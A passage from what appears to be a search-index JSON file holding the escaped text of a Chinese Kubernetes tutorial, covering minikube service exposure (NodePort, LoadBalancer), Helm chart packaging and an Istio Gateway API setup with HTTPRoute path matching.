\u4f46\u662f\uff0c\u8fd8\u6709\u4e2a\u91cd\u8981\u95ee\u9898\u9700\u8981\u89e3\u51b3\uff1a\u5c3d\u7ba1 k8s \u6574\u4e2a\u96c6\u7fa4\u90fd\u5728\u6b63\u5e38\u5de5\u4f5c\uff0c\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u8bbf\u95ee\u5230 producer \u548c consumer\u3002\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u7684 service \u662f ClusterIP \u7c7b\u578b\u7684\uff0c\u53ea\u80fd\u5728\u96c6\u7fa4\u5185\u90e8\u8bbf\u95ee\u3002 \u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\uff0c\u4f60\u53ef\u4ee5\u68c0\u67e5\u51fa\u4f60\u7684\u5fae\u670d\u52a1\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u3002\u6ce8\u610f\uff0c\u53cd\u4ee3\uff0cNodePort \u53ea\u4f1a\u7528\u4e8e\u6d4b\u8bd5\u73af\u5883\uff0c\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5982\u679c\u8282\u70b9\u5f88\u5c11\uff0c\u53ef\u4ee5\u4f7f\u7528 LoadBalancer\uff0c\u4f46\u662f\u4e00\u822c\u90fd\u5e94\u8be5\u4f7f\u7528\u7f51\u5173\u3002\u7f51\u5173\u5c5e\u4e8e\u7edf\u4e00\u8bbf\u95ee\u3002","title":"k8s \u72ec\u7acb\u5916\u90e8\u8bbf\u95ee"},{"location":"20/#_1","text":"\u5728\u5f00\u53d1\u6a21\u5f0f\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 minikube service --all \u6765\u8fdb\u884c\u8f6c\u53d1\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u672c\u5730\u8bbf\u95ee\u5230 k8s \u4e2d\u7684\u670d\u52a1\u3002\u547d\u4ee4\u884c\u4e0a\u4f1a\u663e\u793a\u51fa\u6240\u6709\u53cd\u5411\u4ee3\u7406\u5230\u672c\u673a\u7684\u670d\u52a1\u3002\u6216\u8005\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 minikube service producer-service --url \u6765\u5355\u72ec\u8f6c\u53d1\u3002","title":"\u53cd\u4ee3"},{"location":"20/#nodeport","text":"NodePort \u7c7b\u578b\u7684 service \u53ef\u4ee5\u5c06\u96c6\u7fa4\u7684\u7aef\u53e3\u6620\u5c04\u5230 Node \u7684\u7aef\u53e3\u4e0a\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u4e00\u822c\u7528\u4e8e\u6d4b\u8bd5\u3002 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 service \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5c06 type \u6539\u4e3a NodePort\u3002 apiVersion: v1 kind: Service metadata: name: producer-service spec: selector: app: producer ports: - port: 3000 targetPort: 3000 nodePort: 30001 type: NodePort \u7406\u8bba\u4e0a\uff0c\u53ea\u8981\u8bbf\u95ee minikube \u7684 IP \u5730\u5740\uff08\u4f7f\u7528 minikube ip \u547d\u4ee4\uff09\u548c nodePort\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230 producer \u670d\u52a1\u3002 \u5f88\u53ef\u60dc\uff0c\u5728 MacOS \u6216 Windows \u4e0a\uff0c\u4e8b\u60c5\u6ca1\u8fd9\u4e48\u7b80\u5355\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cminikube \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u800c\u5728 MacOS \u6216 Windows \u4e0a\uff0cdocker \u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e2d\u7684\u3002 \u73b0\u5728\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 minikube ssh \u8fdb\u5165 minikube \u7684\u865a\u62df\u673a\uff0c\u7136\u540e\u4f7f\u7528 curl \u547d\u4ee4\u8bbf\u95ee http://localhost:30001/apple \uff0c\u8fd9\u6837\u662f\u53ef\u4ee5\u8bbf\u95ee\u5230 producer \u670d\u52a1\u7684\u3002 minikube \u5b98\u65b9\u662f\u5e0c\u671b\u7528\u6237\u4f7f\u7528 minikube service producer-service --url \u6765\u8bbf\u95ee\u7684\u3002\u4f46\u662f\u6b63\u5982\u6211\u4eec\u524d\u9762\u6240\u8bf4\u7684\uff0c\u5f00\u53d1\u73af\u5883\u4e2d\uff0cClusterIP \u6a21\u5f0f\u4e5f\u80fd\u8bbf\u95ee\uff0c\u53ea\u662f\u4f1a\u6709 Warning\u3002 \u5982\u679c\u4e0d\u4f7f\u7528 docker\uff0c\u800c\u662f\u4f7f\u7528\u5176\u5b83\u7684\u65e0\u9694\u79bb\u7684\uff0c\u652f\u6301\u76f4\u901a\u7684\u865a\u62df\u673a\u6216\u5bb9\u5668\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u3002","title":"NodePort"},{"location":"20/#loadbalancer","text":"LoadBalancer \u662f k8s \u7684\u6807\u51c6\u66b4\u9732\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u53ef\u4ee5\u7528\u4e8e\u751f\u4ea7\u73af\u5883\u3002\u5177\u4f53\u914d\u7f6e\u53d6\u51b3\u4e8e\u4e91\u670d\u52a1\u5546\u3002Minikube \u652f\u6301\u8fd9\u4e2a\u7c7b\u578b\u3002 \u4f7f\u7528 LoadBalancer \u65f6\uff0c\u670d\u52a1\u63d0\u4f9b\u8005\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u8fd9\u4e2a\u8d1f\u8f7d\u5747\u8861\u5668\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u96c6\u7fa4\u4e2d\u7684 Pod\u3002 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 service \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5c06 type \u6539\u4e3a LoadBalancer\u3002\u79fb\u9664 NodePort\u3002 apiVersion: v1 kind: Service metadata: name: producer-service spec: selector: app: producer ports: - port: 3000 targetPort: 3000 type: LoadBalancer \u7136\u540e\uff0c\u6211\u4eec\u5fc5\u987b\u5f00\u542f tunnel\uff0c\u8fd9\u548c\u4e0a\u9762\u7684 NodePort \u539f\u56e0\u4e00\u6837\uff0c\u4f46\u662f minikube \u4e3a load balancer \u63d0\u4f9b\u4e86 tunnel \u529f\u80fd\uff0c\u53ef\u4ee5\u76f4\u63a5\u628a\u865a\u62df\u673a\u7684\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u3002 minikube tunnel \u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528 kubectl get svc \u6765\u67e5\u770b\u670d\u52a1\u7684\u72b6\u6001\uff0c\u5f53\u5bf9\u5e94\u670d\u52a1 EXTERNAL-IP \u53d8\u4e3a\u4e00\u4e2a IP \u5730\u5740\u65f6\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e2a IP \u5730\u5740\u4e86\u3002\u4f7f\u7528 {EXTERNAL-IP}:{PORT}/apple \u5373\u53ef\u8bbf\u95ee\u3002\u8fd9\u91cc\u7684\u7aef\u53e3\u662f\u4e0a\u6587\u914d\u7f6e\u6587\u4ef6\u4e2d port \u5bf9\u5e94\u7684\u7aef\u53e3\u3002\u5982\u679c\u6ca1\u6709\u5f00\u542f tunnel\uff0cEXTERNAL-IP \u4f1a\u4e00\u76f4\u662f pending\u3002","title":"LoadBalancer"},{"location":"21/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch21 helm \u6253\u5305 istio \u7f51\u5173\u4e0e k8s \u547d\u4ee4\u884c\u5de5\u5177 \u4e0a\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u8bb2\u89e3\u4e86\u5982\u4f55\u5728 k8s \u4e2d\u90e8\u7f72\u7b80\u5355\u7684\u65e0\u72b6\u6001\u670d\u52a1\u3002\u672c\u7ae0\u6bd4\u8f83\u7410\u788e\uff0c\u6709\u4e09\u4e2a\u90e8\u5206\uff0c\u5206\u522b\u662f\u5982\u4f55\u4f7f\u7528 helm \u6253\u5305 k8s \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5982\u4f55\u4f7f\u7528\u7f51\u5173\u5b9e\u73b0\u5fae\u670d\u52a1\u7684\u8bbf\u95ee\uff0ck8s \u7684\u547d\u4ee4\u884c\u5de5\u5177\u7684\u4f7f\u7528\u3002 \u96c6\u7fa4\u6253\u5305 \u524d\u9762\u7684\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\uff0ck8s \u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u7528\u6237\u914d\u7f6e\u8d77\u6765\u4e5f\u5f88\u9ebb\u70e6\uff0c\u8981\u4e00\u4e2a\u4e2a\u627e\uff0c\u800c\u4e14\u8fd9\u4e9b\u914d\u7f6e\u6587\u4ef6\u4f1a\u6709\u5f88\u591a\u91cd\u590d\u7684\u5730\u65b9\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 helm \u8fd9\u4e2a\u5de5\u5177\u3002 helm \u5de5\u5177\u662f\u4e00\u4e2a k8s \u7684\u6253\u5305\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u5c06 k8s \u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2a Chart\uff0c\u7136\u540e\u901a\u8fc7 helm \u8fd9\u4e2a\u5de5\u5177\u6765\u8fdb\u884c\u90e8\u7f72\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2a Chart\uff0c\u7136\u540e\u901a\u8fc7 helm \u8fd9\u4e2a\u5de5\u5177\u6765\u8fdb\u884c\u90e8\u7f72\u3002helm \u7684\u5b89\u88c5\u65b9\u6cd5\u89c1 \u5b98\u65b9\u6587\u6863 \u3002 \u9996\u5148\uff0c\u6211\u4eec\u628a\u4e0a\u4e00\u7ae0\u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2a Chart\u3002\u4f7f\u7528 helm create demo \u6765\u521b\u5efa\u4e00\u4e2a Chart\uff0c\u540d\u5b57\u53eb demo\u3002 Chart \u4e0b\u6709\u4e09\u4e2a\u6587\u4ef6\u5f88\u91cd\u8981\u3002 template \u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5b58\u653e\u4e86\u6240\u6709\u7684\u914d\u7f6e\u6587\u4ef6\u6a21\u7248\u3002\u8fd9\u91cc\u5b58\u653e\u7684\u5c31\u662f\u6211\u4eec\u4e4b\u524d\u7f16\u5199\u7684 k8s \u914d\u7f6e\u6587\u4ef6\u3002\u4e0d\u540c\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u9762\u4f7f\u7528 go \u8bed\u8a00\u7684\u6a21\u7248\u5f15\u64ce\u8bed\u6cd5\uff0c\u4f8b\u5982`{{ .Values.image }}\uff0c\u5c31\u4f1a\u4ece\u8fd9\u4e2a\u6587\u4ef6\u83b7\u53d6\u53d8\u91cf image \u7684\u503c\u3002 values.yaml \u6587\u4ef6\uff0c\u5176\u4e2d\u5b58\u653e\u4e86\u6240\u6709\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u503c\u3002\u8fd9\u91cc\u7684\u503c\u4f1a\u88ab\u7528\u4e8e\u6a21\u7248\u7684\u6e32\u67d3\u3002 Chart.yaml \u6587\u4ef6\uff0c\u5176\u4e2d\u5b58\u653e\u4e86 Chart \u7684\u5143\u6570\u636e\uff0c\u4f8b\u5982 Chart \u7684\u540d\u5b57\uff0c\u7248\u672c\u7b49\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u7528\u6237\u53ef\u4ee5\u81ea\u5df1\u914d\u7f6e RabbitMQ \u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 values.yaml \u6587\u4ef6\u4e2d\u6dfb\u52a0\u8fd9\u4e24\u4e2a\u53d8\u91cf\u3002 rabbitmq: username: guest password: guest \u7136\u540e\uff0c\u5728 template \u6587\u4ef6\u5939\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53d8\u91cf\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: mq spec: selector: matchLabels: app: mq template: metadata: labels: app: mq spec: containers: - name: mq image: rabbitmq:4.0-rc-management resources: limits: memory: \"128Mi\" cpu: \"500m\" env: - name: RABBITMQ_DEFAULT_USER value: {{ .Values.rabbitmq.username }} - name: RABBITMQ_DEFAULT_PASS value: {{ .Values.rabbitmq.password }} ports: - containerPort: 5672 - containerPort: 15672 \u8fd9\u6837\uff0c\u7528\u6237\u5c31\u6709\u4e86\u914d\u7f6e RabbitMQ \u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u80fd\u529b\u3002 Go \u7684\u6a21\u7248\u5f15\u64ce\u5341\u5206\u5f3a\u5927\uff0c\u53ef\u4ee5\u8fdb\u884c\u5faa\u73af\uff0c\u6761\u4ef6\u5224\u65ad\u7b49\u64cd\u4f5c\u3002\u66f4\u591a\u7684\u8bed\u6cd5\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5df2\u7ecf\u5199\u5b8c\u4e86 Chart\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 helm install demo ./demo \u6765\u5b89\u88c5\u8fd9\u4e2a Chart\u3002install \u540e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f Chart \u7684\u540d\u79f0\uff0c\u540e\u7eed\u5bf9 Chart \u64cd\u4f5c\u90fd\u8981\u57fa\u4e8e\u8fd9\u4e2a\u540d\u79f0\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f Chart \u7684\u8def\u5f84\u3002 \u5982\u679c\u6211\u4eec\u505a\u4e86\u66f4\u6539\uff0c\u4e4b\u524d\u662f\u4f7f\u7528 kubectl apply -f . \u6765\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\uff0c\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 helm upgrade demo ./demo \u6765\u66f4\u65b0 Chart\u3002 Chart \u4e4b\u95f4\u53ef\u4ee5\u4e92\u76f8\u4f9d\u8d56\uff0c\u4f9d\u8d56\u5173\u7cfb\u53ef\u4ee5\u5728 Chart.yaml \u6587\u4ef6\u4e2d\u6307\u5b9a\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u4e00\u4e9b\u516c\u5171\u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210 Chart\uff0c\u7136\u540e\u5728\u5176\u4ed6 Chart \u4e2d\u5f15\u7528\u3002\u4f8b\u5982\uff0c dependencies: - name: common version: 0.1.0 repository: file://../common \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u5f53\u524d Chart \u4e2d\u5f15\u7528 common Chart\u3002 \u5982\u679c\u8981\u4fee\u6539\u4f9d\u8d56\u7684\u914d\u7f6e\uff0c\u53ef\u4ee5\u5728 values.yaml \u4e2d\uff0c\u6dfb\u52a0\uff0c common: rabbitmq: username: admin password: admin common \u4ee3\u8868\u4e86\u524d\u9762 dependencies \u4e2d\u7684\u670d\u52a1\u540d\uff0c\u5728\u8fd9\u4e2a key \u4e0b\u7684\u6240\u6709\u53c2\u6570\u90fd\u4f1a\u88ab\u4f20\u9012\u5230 common Chart \u4e2d\u3002 \u8981\u52a0\u8f7d\u4f9d\u8d56\uff0c\u4f7f\u7528 helm dependency update \u547d\u4ee4\u3002\u4e4b\u540e\u7684\u5b89\u88c5\uff0c\u66f4\u65b0\u64cd\u4f5c\u548c\u4e4b\u524d\u4e00\u6837\u3002 \u7f51\u5173 \u5728\u5b66\u4e60 Spring Cloud \u65f6\uff0c\u6211\u4eec\u8bb2\u89e3\u4e86\u5982\u4f55\u4f7f\u7528 Spring Gateway \u6765\u5b9e\u73b0\u7f51\u5173\u3002\u5728 k8s \u4e2d\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u7f51\u5173\u6765\u5b9e\u73b0\u5fae\u670d\u52a1\u7684\u8bbf\u95ee\u3002 \u5728 k8s \u4e2d\uff0c\u901a\u5e38\u79f0\u96c6\u7fa4\u5185\u90e8\u7684\u6d41\u91cf\u4e3a\u4e1c\u897f\u6d41\u91cf\uff08East-West Traffic\uff09\uff0c\u96c6\u7fa4\u5916\u90e8\u7684\u6d41\u91cf\u4e3a\u5317\u5357\u6d41\u91cf\uff08North-South Traffic\uff09\u3002\u4e1c\u897f\u6d41\u91cf\u662f\u6307\u96c6\u7fa4\u5185\u90e8\u7684\u6d41\u91cf\uff0c\u4f8b\u5982\u4e00\u4e2a\u670d\u52a1\u8c03\u7528\u53e6\u4e00\u4e2a\u670d\u52a1\u3002\u5317\u5357\u6d41\u91cf\u662f\u6307\u96c6\u7fa4\u5916\u90e8\u7684\u6d41\u91cf\uff0c\u4f8b\u5982\u7528\u6237\u8bbf\u95ee\u670d\u52a1\u3002\u7f51\u5173\u5373\u662f\u670d\u52a1\u5357\u5317\u6d41\u91cf\u7684\u5165\u53e3\uff0c\u800c\u4e1c\u897f\u6d41\u91cf\u5219\u662f\u7531 k8s \u7684 Service \u6765\u5904\u7406\u7684\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2a Service\uff0c\u5e76\u4f7f\u7528 LoadBalancer \u7c7b\u578b\u3002\u7136\u540e\u5728\u8fd9\u4e2a Service \u4e0a\u66b4\u9732\u4e00\u4e2a Spring Gateway \u7684\u7aef\u53e3\u3002 \u622a\u81f3\u76ee\u524d\uff0ck8s \u7684\u7f51\u5173\u662f Gateway API\uff0c\u5c3d\u7ba1\u5df2\u7ecf\u751f\u4ea7\u53ef\u7528\uff0c\u4f46\u4ecd\u662f\u6bd4\u8f83\u65e9\u671f\u7684\u9636\u6bb5\u3002\u7136\u800c\uff0c\u6b64\u524d\u8d1f\u8d23\u7f51\u5173\u7684 Ingress \u7ec4\u4ef6\u5df2\u7ecf\u5df2\u7ecf\u505c\u6b62\u66f4\u65b0\uff0c\u529f\u80fd\u5c06\u4f1a\u88ab\u8fc1\u79fb\u5230 Gateway API \u4e2d\u3002Ingress \u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u5df2\u7ecf\u88ab\u6807\u8bb0\u4e3a\u8fc7\u65f6\u3002Ingress \u53ea\u652f\u6301 HTTP \u548c HTTPS \u534f\u8bae\uff0c\u800c Gateway API \u652f\u6301\u66f4\u591a\u7684\u534f\u8bae\uff0c\u4f8b\u5982 TCP\uff0cgRPC \u7b49\uff0c\u800c\u4e14\u66f4\u52a0\u7075\u6d3b\u5f3a\u5927\u3002 \u6ce8\u610f\uff0ck8s \u7684 Gateway API \u53ea\u89c4\u5b9a\u4e86 API\uff0c\u6ca1\u6709\u89c4\u5b9a\u5b9e\u73b0\u3002\u76ee\u524d\uff0c\u6709\u5f88\u591a\u5b9e\u73b0\u4e86 Gateway API \u7684\u7f51\u5173\uff0c\u4f8b\u5982 Istio\uff0cKong\uff0cTraefik \u7b49\u3002\u8fd9\u91cc\u6211\u4eec\u4ee5 Istio \u4e3a\u4f8b\u3002 Gateway \u76ee\u524d\u4e0d\u662f k8s \u7684\u539f\u751f\u8d44\u6e90\uff0c\u800c\u662f\u901a\u8fc7 CRD \u6765\u5b9e\u73b0\u7684\u3002CRD \u662f k8s \u7684\u4e00\u79cd\u6269\u5c55\u673a\u5236\uff0c\u53ef\u4ee5\u901a\u8fc7 CRD \u6765\u5b9a\u4e49\u65b0\u7684\u8d44\u6e90\u3002CRD \u5168\u79f0\u662f Custom Resource Definition\uff0c\u5373\u81ea\u5b9a\u4e49\u8d44\u6e90\u5b9a\u4e49\u3002 \u6839\u636e \u6587\u6863 \uff0c\u4f7f\u7528\u4e0b\u6587\u547d\u4ee4\u5b89\u88c5 Istio \u7684 CRD\u3002 kubectl get crd gateways.gateway.networking.k8s.io &> /dev/null || \\ { kubectl kustomize \"github.com/kubernetes-sigs/gateway-api/config/crd?ref=v1.1.0\" | kubectl apply -f -; } \u5728 helm \u4e2d\uff0c\u53ef\u4ee5\u5c06\u83b7\u53d6\u5230\u7684 CRD \u5b89\u88c5\u6587\u4ef6\u653e\u5728\u4e0e templates \u540c\u7ea7\u7684 crds \u6587\u4ef6\u5939\u4e2d\u3002CRD \u4f1a\u5728\u5b89\u88c5 Chart \u65f6\u81ea\u52a8\u5b89\u88c5\u3002 \u4f46\u662f\uff0c\u73b0\u5728\u53ea\u662f\u5b89\u88c5\u4e86 CRD\uff0c\u8fd8\u6ca1\u6709\u5b9e\u9645\u7684\u7f51\u5173\u5de5\u4f5c\u7684 Pod\u3002\u8981\u5b9e\u73b0\u7f51\u5173\uff0c\u8fd8\u9700\u8981\u5b89\u88c5 Istio \u7684\u7f51\u5173\u7ec4\u4ef6\u3002Istio \u7684\u7f51\u5173\u7ec4\u4ef6\u662f\u4e00\u4e2a Envoy \u7684\u5b9e\u4f8b\uff0cEnvoy \u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684\u4ee3\u7406\uff0c\u7528\u4e8e\u5904\u7406\u6240\u6709\u7684\u6d41\u91cf\u3002Istio \u7684\u7f51\u5173\u7ec4\u4ef6\u4f1a\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\u3002 \u5de5\u7a0b\u4e0a\uff0c\u6211\u4eec\u9996\u5148\u8981\u5b89\u88c5 istioctl \uff0c\u8fd9\u662f Istio \u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u5b89\u88c5\u65b9\u6cd5\u53c2\u8003 \u6587\u6863 \u3002\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 istioctl install --set profile=minimal \u6765\u628a Istio \u5b89\u88c5\u5230\u96c6\u7fa4\u4e2d\u3002\u8fd9\u91cc\u7684 minimal \u662f\u6307\u6700\u5c0f\u7684\u914d\u7f6e\uff0c\u53ea\u5305\u542b\u4e86 Istio \u7684\u6838\u5fc3\u7ec4\u4ef6\u3002\u5b83\u4f1a\u5411\u6211\u4eec\u7684\u96c6\u7fa4\u6dfb\u52a0\u4e00\u4e2a Service\uff0c\u4e00\u4e2a Deployment\u3002 \u7b80\u5355\u5168\u8f6c\u53d1 \u9996\u5148\u6211\u4eec\u6765\u5b9e\u73b0\u4e00\u4e2a\u5168\u8f6c\u53d1\u7f51\u5173\u3002\u5168\u8f6c\u53d1\u7f51\u5173\u662f\u6307\uff0c\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u4f1a\u88ab\u8f6c\u53d1\u5230\u4e00\u4e2a\u670d\u52a1\u4e0a\u3002 \u6211\u4eec\u9996\u5148\u5148\u5efa\u7acb\u597d\u6211\u4eec\u4e4b\u524d\u6784\u5efa\u7684\u670d\u52a1\u96c6\u7fa4\uff0c\u7136\u540e\u6dfb\u52a0 Istio \u7684 CRD\u3002 Gateway API \u89c4\u5b9a\u4e86\u4e09\u7c7b\u7ec4\u4ef6\uff0cGateway Class\uff0c\u7f51\u5173\u7684\u63d0\u4f9b\u8005\uff1bGateway\uff0c\u7f51\u5173\u5b9e\u4f8b\uff1bRoute \u8def\u7531\u3002Gateway Class \u5728\u5b89\u88c5 Istio \u65f6\u5df2\u7ecf\u5b89\u88c5\u597d\u4e86\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5b9a\u4e49 Gateway \u548c Route\u3002 \u9996\u5148\u5b9a\u4e49 Gateway\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: Gateway metadata: name: gateway spec: gatewayClassName: istio listeners: - name: default port: 80 protocol: HTTP allowedRoutes: namespaces: from: All listeners \u662f\u7f51\u5173\u8981\u76d1\u542c\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u662f\u76d1\u542c 80 \u7aef\u53e3\uff0c\u534f\u8bae\u662f HTTP\u3002allowedRoutes \u662f\u5141\u8bb8\u7684\u8def\u7531\uff0c\u8fd9\u91cc\u662f\u6240\u6709\u7684\u8def\u7531\u3002 \u7136\u540e\u5b9a\u4e49 Route\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: producer-router spec: parentRefs: - name: gateway rules: - backendRefs: - name: producer-service port: 3001 parentRefs \u662f\u6307\u5b9a\u8fd9\u4e2a Route \u5c5e\u4e8e\u54ea\u4e2a Gateway\u3002rules \u662f\u8def\u7531\u89c4\u5219\uff0c\u8fd9\u91cc\u662f\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\u3002 \u7ecf\u8fc7\u4e0a\u9762\u7684\u914d\u7f6e\uff0c\u6240\u6709\u5230\u8fbe\u7f51\u5173 80 \u7aef\u53e3\u7684\u8bf7\u6c42\u90fd\u4f1a\u88ab\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\u3002\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u50cf\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u4e00\u6837\u8bbf\u95ee\u7f51\u5173\u7684\u670d\u52a1\uff0c\u800c\u7f51\u5173\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\u3002 \u8def\u5f84\u5339\u914d\u4e0e\u91cd\u5199 \u5168\u8f6c\u53d1\u7f51\u5173\u662f\u5c06\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u8f6c\u53d1\u5230\u4e00\u4e2a\u670d\u52a1\u4e0a\uff0c\u800c\u8def\u5f84\u5339\u914d\u7f51\u5173\u662f\u6839\u636e\u8bf7\u6c42\u7684\u8def\u5f84\u6765\u8f6c\u53d1\u5230\u4e0d\u540c\u7684\u670d\u52a1\u4e0a\u3002 \u5047\u8bbe\u6211\u4eec\u5e0c\u671b\u901a\u8fc7\u7f51\u5173\u8def\u5f84 /producer \u7684\u8bf7\u6c42\u8f6c\u53d1\u5230 producer-service\uff0c\u8def\u5f84 /consumer \u7684\u8bf7\u6c42\u8f6c\u53d1\u5230 consumer-service\u3002\u53ea\u8981\u4fee\u6539 Route \u7684\u89c4\u5219\u5373\u53ef\u3002\u6211\u4eec\u9700\u8981\u9996\u5148\u5339\u914d\u8def\u5f84\u548c\u670d\u52a1\uff0c\u7136\u540e\u91cd\u5199\u8bf7\u6c42\u7684\u8def\u5f84\u3002 \u524d\u9762\u6211\u4eec\u7684 Rules \u6ca1\u6709\u5339\u914d\u89c4\u5219\uff0c\u6240\u4ee5\u8f6c\u53d1\u4e86\u6240\u6709\u7684\u8bf7\u6c42\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u6dfb\u52a0\u5339\u914d\u89c4\u5219\u3002 apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: router spec: parentRefs: - name: gateway rules: - matches: - path: type: PathPrefix value: /producer backendRefs: - name: producer-service port: 3001 - matches: - path: type: PathPrefix value: /consumer backendRefs: - name: consumer-service port: 3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u6dfb\u52a0\u4e86\u4e24\u4e2a\u5339\u914d\u89c4\u5219\uff0c\u7b2c\u4e00\u4e2a\u89c4\u5219\u662f\u5339\u914d\u8def\u5f84\u524d\u7f00\u4e3a /producer \u7684\u8bf7\u6c42\uff0c\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\u3002\u7b2c\u4e8c\u4e2a\u89c4\u5219\u662f\u5339\u914d\u8def\u5f84\u524d\u7f00\u4e3a /consumer \u7684\u8bf7\u6c42\uff0c\u8f6c\u53d1\u5230 consumer-service \u7684 3002 \u7aef\u53e3\u3002matches \u91cc\u7684 path \u8868\u793a\u8def\u5f84\u5339\u914d\uff0c\u8def\u5f84\u5339\u914d\u6709\u4e09\u79cd\u7c7b\u578b\uff0c Exact \uff0c Prefix \uff0c Regex \uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e86 Prefix \u7c7b\u578b\u3002 \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u5339\u914d Host\uff0cHeader\uff0cMethod \u7b49\u3002 \u6ce8\u610f\uff0c\u73b0\u5728\u5c3d\u7ba1\u8bf7\u6c42\u80fd\u88ab\u8f6c\u53d1\uff0c\u4f46\u662f\u8def\u5f84\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002 /producer/apple \u88ab\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\uff0c\u4f46\u662f\u8def\u5f84\u4ecd\u7136\u662f /producer/apple \u3002\u5982\u679c\u6211\u4eec\u5e0c\u671b\u8def\u5f84\u53d1\u751f\u53d8\u5316\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 rewrite \u3002 apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: router spec: parentRefs: - name: gateway 